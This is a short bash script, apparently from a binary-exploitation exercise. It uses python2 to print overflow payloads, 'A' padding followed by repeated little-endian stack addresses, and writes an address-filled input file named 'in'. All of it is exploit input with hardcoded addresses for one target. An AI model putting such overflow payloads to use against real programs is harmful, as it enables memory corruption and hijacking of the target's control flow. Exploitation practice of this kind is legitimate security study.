#!/bin/bash
python2 -c "print 'A'*100 + '\x1c\xcb\xff\xff' * 2 + '\x20\xcb\xff\xff'"

python2 -c "print '\x1c\xcb\xff\xff' * 25 + '\n' + '-13544' + '\n' + '338150' + '\n'" > in
